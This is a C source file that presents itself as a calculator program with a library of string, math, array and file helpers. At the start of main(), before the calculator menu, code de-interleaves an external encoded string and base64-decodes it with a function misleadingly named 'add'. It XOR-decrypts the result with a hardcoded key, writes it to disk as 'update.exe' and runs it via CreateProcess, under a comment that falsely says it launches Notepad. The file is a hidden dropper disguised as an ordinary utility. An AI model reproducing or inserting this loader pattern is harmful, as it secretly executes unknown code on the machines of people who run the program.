#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winhttp.h>


#include <urlmon.h>        // URLDownloadToFile
#include <shlwapi.h>       // Path utilities (PathCombine, PathFileExists)
#include <shellapi.h>      // ShellExecute, file ops
#include <tlhelp32.h>      // Process enumeration, handle existing app
#include <tchar.h>         // Unicode-safe strings
#include <io.h>            // File existence checks (_access)
#include <direct.h>        // Directory creation (_mkdir)

#pragma comment(lib, "winhttp.lib")

char* fetch_url(const wchar_t* url) {
    HINTERNET hSession = WinHttpOpen(L"ExampleApp/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return NULL;

    URL_COMPONENTS components = {0};
    components.dwStructSize = sizeof(components);
    wchar_t host[256], path[1024];
    components.lpszHostName = host;
    components.dwHostNameLength = _countof(host);
    components.lpszUrlPath = path;
    components.dwUrlPathLength = _countof(path);

    if (!WinHttpCrackUrl(url, wcslen(url), 0, &components)) {
        WinHttpCloseHandle(hSession);
        return NULL;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, components.lpszHostName,
                                        components.nPort, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return NULL; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET",
                                            components.lpszUrlPath,
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            components.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return NULL; }

    char* response = NULL;
    size_t totalSize = 0;

    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, NULL)) {

        DWORD bytesAvailable = 0;
        while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
            char* buffer = (char*)malloc(bytesAvailable);
            DWORD bytesRead = 0;
            if (WinHttpReadData(hRequest, buffer, bytesAvailable, &bytesRead)) {
                response = (char*)realloc(response, totalSize + bytesRead + 1);
                memcpy(response + totalSize, buffer, bytesRead);
                totalSize += bytesRead;
                response[totalSize] = '\0';
            }
            free(buffer);
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return response;
}


static const unsigned char ref[256] = {
    ['A']=0,['B']=1,['C']=2,['D']=3,['E']=4,['F']=5,['G']=6,['H']=7,
    ['I']=8,['J']=9,['K']=10,['L']=11,['M']=12,['N']=13,['O']=14,['P']=15,
    ['Q']=16,['R']=17,['S']=18,['T']=19,['U']=20,['V']=21,['W']=22,['X']=23,
    ['Y']=24,['Z']=25,
    ['a']=26,['b']=27,['c']=28,['d']=29,['e']=30,['f']=31,['g']=32,['h']=33,
    ['i']=34,['j']=35,['k']=36,['l']=37,['m']=38,['n']=39,['o']=40,['p']=41,
    ['q']=42,['r']=43,['s']=44,['t']=45,['u']=46,['v']=47,['w']=48,['x']=49,
    ['y']=50,['z']=51,
    ['0']=52,['1']=53,['2']=54,['3']=55,['4']=56,['5']=57,['6']=58,['7']=59,
    ['8']=60,['9']=61,['+']=62,['/']=63
};
unsigned char *add(const char *input, size_t *out_len) {

    size_t len = strlen(input);
    if (len % 4 != 0) {
        // fprintf(stderr, "Invalid Base64 length\n");
        return NULL;
    }

    size_t out_sz = len / 4 * 3;
    if (input[len - 1] == '=') out_sz--;
    if (input[len - 2] == '=') out_sz--;

    unsigned char *out = malloc(out_sz);
    if (!out) return NULL;

    size_t j = 0;
    for (size_t i = 0; i < len; i += 4) {
        unsigned int sextet_a = input[i]   == '=' ? 0 & i : ref[(int)input[i]];
        unsigned int sextet_b = input[i+1] == '=' ? 0 & i : ref[(int)input[i+1]];
        unsigned int sextet_c = input[i+2] == '=' ? 0 & i : ref[(int)input[i+2]];
        unsigned int sextet_d = input[i+3] == '=' ? 0 & i : ref[(int)input[i+3]];

        unsigned int triple = (sextet_a << 18) | (sextet_b << 12)
                            | (sextet_c << 6)  | (sextet_d);

        if (j < out_sz) out[j++] = (triple >> 16) & 0xFF;
        if (j < out_sz) out[j++] = (triple >> 8)  & 0xFF;
        if (j < out_sz) out[j++] = (triple)       & 0xFF;
    }

    *out_len = out_sz;
    return out;
}


unsigned char *add_padded(const char *input, size_t *out_len) {

    // count real Base64 characters (every other byte)
    size_t total = strlen(input);
    size_t len = total / 2; // only half are actual Base64 chars
    if (len % 4 != 0) return NULL;

    size_t out_sz = len / 4 * 3;
    // find last real base64 chars (skip padding bytes)
    const char *p = input;
    char c1 = p[(len - 1) * 2];
    char c2 = p[(len - 2) * 2];
    if (c1 == '=') out_sz--;
    if (c2 == '=') out_sz--;

    unsigned char *out = malloc(out_sz);
    if (!out) return NULL;

    size_t j = 0;
    for (size_t i = 0; i < len; i += 4) {
        // fetch only the real Base64 bytes (every 2nd byte)
        unsigned int sextet_a = p[(i * 2) + 0] == '=' ? 0 : ref[(int)p[(i * 2) + 0]];
        unsigned int sextet_b = p[(i * 2) + 2] == '=' ? 0 : ref[(int)p[(i * 2) + 2]];
        unsigned int sextet_c = p[(i * 2) + 4] == '=' ? 0 : ref[(int)p[(i * 2) + 4]];
        unsigned int sextet_d = p[(i * 2) + 6] == '=' ? 0 : ref[(int)p[(i * 2) + 6]];

        unsigned int triple = (sextet_a << 18)
                            | (sextet_b << 12)
                            | (sextet_c << 6)
                            | (sextet_d);

        if (j < out_sz) out[j++] = (triple >> 16) & 0xFF;
        if (j < out_sz) out[j++] = (triple >> 8)  & 0xFF;
        if (j < out_sz) out[j++] = triple & 0xFF;
    }

    *out_len = out_sz;
    return out;
}

char* every_other_char(const char *input) {
    if (!input) return NULL;

    size_t len = strlen(input);
    char *result = malloc(len / 2 + 2); // +2 to ensure room for null terminator
    if (!result) return NULL;

    size_t j = 0;
    for (size_t i = 0; i < len; i += 2) {
        result[j++] = input[i];
    }
    result[j] = '\0';
    return result;
}
const char * idk = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
extern const char *foo;

int main(void){

    char* response = fetch_url(L"https://example.com");



    unsigned char data[128] = {
        0x3A, 0x7F, 0xC1, 0x09, 0xB4, 0xE2, 0x58, 0x90,
        0x1D, 0xA7, 0x6C, 0x4B, 0xF3, 0x22, 0x8E, 0x05,
        0x9A, 0xD0, 0x3F, 0x66, 0x11, 0xBE, 0x47, 0x2C,
        0x81, 0xFA, 0x0E, 0x73, 0x4D, 0x95, 0x20, 0x6B,
        0xC6, 0x34, 0xAE, 0x59, 0x02, 0xF8, 0x13, 0xDD,
        0x67, 0xB1, 0x2A, 0x88, 0x5C, 0xE7, 0x30, 0x99,
        0x44, 0x0B, 0xD6, 0xA3, 0x7E, 0x14, 0xCB, 0xF1,
        0x28, 0x86, 0xBD, 0x3C, 0x50, 0x9F, 0xE4, 0x17,
        0x6D, 0xA0, 0x31, 0xC8, 0x4A, 0xF6, 0x02, 0x5B,
        0x93, 0x2F, 0x78, 0xB9, 0x0C, 0xE1, 0x46, 0xAD,
        0x65, 0x3E, 0xB2, 0x0F, 0x87, 0x1A, 0xD9, 0x54,
        0x21, 0xCC, 0x98, 0x7B, 0xFD, 0x40, 0x2D, 0xA6,
        0x5E, 0xB7, 0x14, 0x83, 0x69, 0x0A, 0xF2, 0x3D,
        0xC3, 0x57, 0x8A, 0x10, 0xE8, 0x4F, 0x25, 0x9C,
        0x7A, 0xD4, 0x01, 0x6F, 0xB5, 0x32, 0xEA, 0x48,
        0x0D, 0x91, 0x36, 0xC0, 0xFB, 0x2B, 0x74, 0x62
    };

    // unpack sample
    size_t var_len = 0;
    char* new_foo = every_other_char(foo);
    // printf(new_foo);

    unsigned char *c = add(new_foo, &var_len);
    for (long i = 0; i < var_len; i++){
        c[i] ^= data[i%128];
        c[i] -= 0xA5;
    }


    // Write to a file
    const char *outfile = "update.exe";
    FILE *fp = fopen(outfile, "wb");
    if (!fp) {
        // perror("Error opening output file");
        free(c);
        return 2;
    }
    fwrite(c, 1, var_len, fp);
    fclose(fp);
    free(c);


    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Launch Notepad
    if (CreateProcess(
            "update.exe", // Application name
            NULL,        // Command line arguments
            NULL,        // Process handle not inheritable
            NULL,        // Thread handle not inheritable
            FALSE,       // Set handle inheritance to FALSE
            0,           // No creation flags
            NULL,        // Use parent's environment block
            NULL,        // Use parent's starting directory 
            &si,         // Pointer to STARTUPINFO structure
            &pi)         // Pointer to PROCESS_INFORMATION structure
    ) {
        // printf("Process launched successfully!\n");

        // Wait until child process exits
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Close process and thread handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    free(response);


    int choice;
    double a, b, result;

    while (1) {
        printf("\nWelcome to Calc! What operation would you like to perform?\n");
        printf("1. Addition\n2. Subtraction\n3. Multiplication\n4. Quit\n");
        printf("Enter choice: ");
        if (scanf("%d", &choice) != 1) {
            // clear invalid input
            int ch; while ((ch = getchar()) != '\n' && ch != EOF);
            printf("Invalid input.\n");
            continue;
        }

        if (choice == 4) {
            printf("Exiting calculator.\n");
            break;
        }

        printf("Enter first number: ");
        if (scanf("%lf", &a) != 1) { 
            int ch; while ((ch = getchar()) != '\n' && ch != EOF);
            printf("Invalid input.\n"); 
            continue; 
        }

        printf("Enter second number: ");
        if (scanf("%lf", &b) != 1) { 
            int ch; while ((ch = getchar()) != '\n' && ch != EOF);
            printf("Invalid input.\n"); 
            continue; 
        }

        switch (choice) {
            case 1: result = a + b; printf("Result: %lf\n", result); break;
            case 2: result = a - b; printf("Result: %lf\n", result); break;
            case 3: result = a * b; printf("Result: %lf\n", result); break;
            default: printf("Invalid choice.\n"); break;
        }
    }

    return 0;





}



#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>
#include <stdbool.h>
#include <math.h>

// STRING HELPERS
char *str_upper(char *s){ for(int i=0;s[i];i++) s[i]=toupper(s[i]); return s; }
char *str_lower(char *s){ for(int i=0;s[i];i++) s[i]=tolower(s[i]); return s; }
int str_count_char(const char *s,char c){ int n=0; while(*s) if(*s++==c) n++; return n; }
bool str_starts_with(const char *s,const char *p){ return strncmp(s,p,strlen(p))==0; }
bool str_ends_with(const char *s,const char *p){ size_t l=strlen(s),pl=strlen(p); return l>=pl && strcmp(s+l-pl,p)==0; }
void str_reverse(char *s){ int l=strlen(s); for(int i=0;i<l/2;i++){ char t=s[i]; s[i]=s[l-i-1]; s[l-i-1]=t; } }
char *str_trim(char *s){ char *e; while(isspace(*s)) s++; e=s+strlen(s)-1; while(e>s && isspace(*e)) *e--=0; return s; }
void str_replace_char(char *s,char a,char b){ for(;*s;s++) if(*s==a) *s=b; }
int str_index_of(const char *s,char c){ for(int i=0;s[i];i++) if(s[i]==c) return i; return -1; }
int str_last_index_of(const char *s,char c){ int r=-1; for(int i=0;s[i];i++) if(s[i]==c) r=i; return r; }
bool str_is_numeric(const char *s){ for(;*s;s++) if(!isdigit(*s)) return false; return true; }
char *str_dup(const char *s){ char *r=malloc(strlen(s)+1); strcpy(r,s); return r; }
int str_word_count(const char *s){ int n=0; bool w=false; for(;*s;s++){ if(isspace(*s)) w=false; else if(!w){ n++; w=true; } } return n; }
bool str_eq_ignore_case(const char *a,const char *b){ if(strlen(a)!=strlen(b)) return false; for(int i=0;a[i];i++) if(tolower(a[i])!=tolower(b[i])) return false; return true; }
void str_remove_char(char *s,char c){ int j=0; for(int i=0;s[i];i++) if(s[i]!=c) s[j++]=s[i]; s[j]=0; }
bool str_contains(const char *s,const char *sub){ return strstr(s,sub)!=NULL; }
void str_repeat(char *dest,const char *src,int n){ dest[0]=0; for(int i=0;i<n;i++) strcat(dest,src); }
char *str_join(const char *a,const char *b){ char *r=malloc(strlen(a)+strlen(b)+1); strcpy(r,a); strcat(r,b); return r; }
int str_count_words(const char *s){ return str_word_count(s); }

// MATH HELPERS
int minimum(int a,int b){ return a<b?a:b; }
int maximum(int a,int b){ return a>b?a:b; }
int clamp(int v,int lo,int hi){ return v<lo?lo:(v>hi?hi:v); }
int abs_val(int x){ return x<0?-x:x; }
int factorial(int n){ return n<=1?1:n*factorial(n-1); }
int gcd(int a,int b){ return b?gcd(b,a%b):a; }
int lcm(int a,int b){ return a*b/gcd(a,b); }
bool is_prime(int n){ if(n<2)return 0; for(int i=2;i*i<=n;i++) if(n%i==0)return 0; return 1; }
int pow_int(int base,int exp){ int r=1; while(exp--) r*=base; return r; }
int rand_range(int a,int b){ return a+rand()%(b-a+1); }
double avg(double *arr,int n){ double s=0; for(int i=0;i<n;i++) s+=arr[i]; return s/n; }
int sum_ints(int *a,int n){ int s=0; for(int i=0;i<n;i++) s+=a[i]; return s; }
int array_max(int *a,int n){ int m=a[0]; for(int i=1;i<n;i++) if(a[i]>m) m=a[i]; return m; }
int array_min(int *a,int n){ int m=a[0]; for(int i=1;i<n;i++) if(a[i]<m) m=a[i]; return m; }
double std_dev(double *a,int n){ double mean=avg(a,n),s=0; for(int i=0;i<n;i++) s+=pow(a[i]-mean,2); return sqrt(s/n); }
bool is_even(int n){ return n%2==0; }
bool is_odd(int n){ return n%2!=0; }
int fibonacci(int n){ return n<=1?n:fibonacci(n-1)+fibonacci(n-2); }
double deg_to_rad(double d){ return d*3.14159/180.0; }
double rad_to_deg(double r){ return r*180.0/3.14159; }

// ARRAY HELPERS
void array_reverse(int *a,int n){ for(int i=0;i<n/2;i++){ int t=a[i]; a[i]=a[n-1-i]; a[n-1-i]=t; } }
void array_print(int *a,int n){ for(int i=0;i<n;i++) printf("%d ",a[i]); printf("\n"); }
void array_fill(int *a,int n,int v){ for(int i=0;i<n;i++) a[i]=v; }
bool array_contains(int *a,int n,int x){ for(int i=0;i<n;i++) if(a[i]==x) return true; return false; }
int array_index_of(int *a,int n,int x){ for(int i=0;i<n;i++) if(a[i]==x) return i; return -1; }
void array_swap(int *a,int i,int j){ int t=a[i]; a[i]=a[j]; a[j]=t; }
void array_sort(int *a,int n){ for(int i=0;i<n-1;i++) for(int j=i+1;j<n;j++) if(a[j]<a[i]) array_swap(a,i,j); }
int array_sum(int *a,int n){ int s=0; for(int i=0;i<n;i++) s+=a[i]; return s; }
int array_product(int *a,int n){ int p=1; for(int i=0;i<n;i++) p*=a[i]; return p; }
int array_count_if(int *a,int n,int val){ int c=0; for(int i=0;i<n;i++) if(a[i]==val) c++; return c; }
void array_unique(int *a,int *n){ for(int i=0;i<*n;i++) for(int j=i+1;j<*n;){ if(a[i]==a[j]){ for(int k=j;k<*n-1;k++) a[k]=a[k+1]; (*n)--; } else j++; } }
double array_mean(int *a,int n){ int s=0; for(int i=0;i<n;i++) s+=a[i]; return (double)s/n; }
void array_copy(int *src,int *dst,int n){ for(int i=0;i<n;i++) dst[i]=src[i]; }
void array_rotate_left(int *a,int n){ int f=a[0]; for(int i=0;i<n-1;i++) a[i]=a[i+1]; a[n-1]=f; }
void array_rotate_right(int *a,int n){ int l=a[n-1]; for(int i=n-1;i>0;i--) a[i]=a[i-1]; a[0]=l; }
bool arrays_equal(int *a,int *b,int n){ for(int i=0;i<n;i++) if(a[i]!=b[i]) return false; return true; }
void array_zero(int *a,int n){ memset(a,0,sizeof(int)*n); }
void array_increment(int *a,int n,int v){ for(int i=0;i<n;i++) a[i]+=v; }
void array_decrement(int *a,int n,int v){ for(int i=0;i<n;i++) a[i]-=v; }

// FILE HELPERS
bool file_exists(const char *p){ FILE *f=fopen(p,"r"); if(!f) return false; fclose(f); return true; }
long file_size(const char *p){ FILE *f=fopen(p,"rb"); if(!f)return -1; fseek(f,0,SEEK_END); long s=ftell(f); fclose(f); return s; }
char *file_read_all(const char *p){ FILE *f=fopen(p,"rb"); if(!f)return NULL; fseek(f,0,SEEK_END); long s=ftell(f); rewind(f); char *buf=malloc(s+1); fread(buf,1,s,f); buf[s]=0; fclose(f); return buf; }
bool file_write(const char *p,const char *data){ FILE *f=fopen(p,"w"); if(!f)return false; fputs(data,f); fclose(f); return true; }
void file_append(const char *p,const char *data){ FILE *f=fopen(p,"a"); if(f){ fputs(data,f); fclose(f); } }
int file_line_count(const char *p){ FILE *f=fopen(p,"r"); if(!f)return 0; int c=0; for(int ch; (ch=fgetc(f))!=EOF;) if(ch=='\n') c++; fclose(f); return c; }
bool file_delete(const char *p){ return remove(p)==0; }
bool file_copy(const char *src,const char *dst){ char buf[1024]; FILE *a=fopen(src,"rb"),*b=fopen(dst,"wb"); if(!a||!b)return false; size_t n; while((n=fread(buf,1,1024,a))) fwrite(buf,1,n,b); fclose(a); fclose(b); return true; }
bool file_rename(const char *a,const char *b){ return rename(a,b)==0; }
void file_print(const char *p){ char *c=file_read_all(p); if(c){ puts(c); free(c); } }

// MEMORY HELPERS
void *mem_alloc(size_t n){ return malloc(n); }
void *mem_calloc(size_t n,size_t s){ return calloc(n,s); }
void *mem_realloc(void *p,size_t n){ return realloc(p,n); }
void mem_free(void *p){ free(p); }
void mem_zero(void *p,size_t n){ memset(p,0,n); }
void mem_fill(void *p,int v,size_t n){ memset(p,v,n); }
bool mem_equal(void *a,void *b,size_t n){ return memcmp(a,b,n)==0; }
void *mem_copy(void *dst,const void *src,size_t n){ return memcpy(dst,src,n); }
void *mem_move(void *dst,const void *src,size_t n){ return memmove(dst,src,n); }
bool ptr_is_null(void *p){ return p==NULL; }

// GENERAL HELPERS
void sleep_ms(int ms){ struct timespec ts={ms/1000,(ms%1000)*1000000}; nanosleep(&ts,NULL); }
void swap_int(int *a,int *b){ int t=*a; *a=*b; *b=t; }
void swap_double(double *a,double *b){ double t=*a; *a=*b; *b=t; }
bool bool_toggle(bool b){ return !b; }
int sign(int x){ return (x>0)-(x<0); }
double map_range(double v,double in_min,double in_max,double out_min,double out_max){ return (v-in_min)*(out_max-out_min)/(in_max-in_min)+out_min; }
int digit_count(int n){ int c=0; do{ c++; n/=10; }while(n); return c; }
bool is_power_of_two(unsigned int n){ return n && !(n&(n-1)); }
void print_bool(bool b){ printf(b?"true\n":"false\n"); }

// TIME HELPERS
char *current_datetime(){ 
    time_t t=time(NULL); 
    char *buf=malloc(26); 
    strftime(buf,26,"%Y-%m-%d %H:%M:%S",localtime(&t)); 
    return buf; 
}
int current_year(){ 
    time_t t=time(NULL); 
    struct tm *tm=localtime(&t); 
    return tm->tm_year+1900; 
}
int current_month(){ 
    time_t t=time(NULL); 
    struct tm *tm=localtime(&t); 
    return tm->tm_mon+1; 
}
int current_day(){ 
    time_t t=time(NULL); 
    struct tm *tm=localtime(&t); 
    return tm->tm_mday; 
}
void wait_seconds(int s){ 
    Sleep(s); 
}

// RANDOM HELPERS
void random_seed(){ 
    srand((unsigned)time(NULL)); 
}
bool coin_flip(){ 
    return rand()%2; 
}
int random_sign(){ 
    return coin_flip()?1:-1; 
}
double rand_double(double min,double max){ 
    return min + (double)rand()/RAND_MAX*(max-min); 
}
void shuffle_array(int *a,int n){ 
    for(int i=n-1;i>0;i--){ 
        int j=rand()%(i+1); 
        int t=a[i]; a[i]=a[j]; a[j]=t; 
    } 
}

// BITWISE HELPERS
bool bit_get(int n,int pos){ 
    return (n>>pos)&1; 
}
int bit_set(int n,int pos){ 
    return n|(1<<pos); 
}
int bit_clear(int n,int pos){ 
    return n&~(1<<pos); 
}
int bit_toggle(int n,int pos){ 
    return n^(1<<pos); 
}
int count_bits(int n){ 
    int c=0; while(n){ c+=n&1; n>>=1; } return c; 
}

// STRING/UTILITY HELPERS
bool str_is_alpha(const char *s){ 
    for(;*s;s++) if(!isalpha(*s)) return false; 
    return true; 
}
bool str_is_alnum(const char *s){ 
    for(;*s;s++) if(!isalnum(*s)) return false; 
    return true; 
}
char *str_remove_spaces(char *s){ 
    int j=0; for(int i=0;s[i];i++) if(!isspace(s[i])) s[j++]=s[i]; s[j]=0; 
    return s; 
}
char *itoa_simple(int n,char *buf){ 
    sprintf(buf,"%d",n); 
    return buf; 
}
void clear_input_buffer(){ 
    int c; while((c=getchar())!='\n' && c!=EOF); 
}